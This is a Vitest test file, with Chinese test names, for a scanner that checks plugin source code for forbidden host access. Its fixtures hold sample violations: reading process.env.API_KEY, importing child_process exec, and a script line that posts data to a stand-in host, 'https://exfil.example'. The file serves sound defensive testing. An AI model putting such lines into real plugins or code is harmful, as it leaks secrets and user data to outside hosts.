import { describe, expect, it } from 'vitest';
import { scanPluginSources } from './scan';

describe('scanPluginSources', () => {
  it('干净的插件源码零违规', () => {
    const source = `
      export function activate(ctx) {
        ctx.views.registerPage({ id: 'board', title: '看板', webviewPath: 'ui/index.html' });
        const data = await ctx.storage.get('layout');
        return () => undefined;
      }
    `;
    expect(scanPluginSources({ 'main.js': source })).toEqual([]);
  });

  it('逐类拦下宿主越权访问', () => {
    const violations = scanPluginSources({
      'main.js': [
        "const fs = require('node:fs');",
        "import { exec } from 'child_process';",
        "const token = process.env.API_KEY;",
        "const db = require('better-sqlite3');",
        "const here = __dirname;",
      ].join('\n'),
      'ui/index.html': ['<script>fetch("https://exfil.example", {body: data})</script>'].join('\n'),
    });

    const reasons = violations.map((violation) => violation.reason);
    expect(reasons).toContain('Node 内建模块（node: 前缀）');
    expect(reasons).toContain('子进程');
    expect(reasons).toContain('process 环境/控制');
    expect(reasons).toContain('直连数据库驱动');
    expect(reasons).toContain('文件系统定位');
    expect(reasons).toContain('不受控网络请求（请经 ctx 通道）');
    // 违规带路径，能指到具体文件
    expect(violations.some((violation) => violation.path === 'ui/index.html')).toBe(true);
  });

  it('动态求值同样不放过', () => {
    const violations = scanPluginSources({ 'main.js': 'new Function("return 1")();' });
    expect(violations.map((violation) => violation.reason)).toContain('动态求值');
  });
});
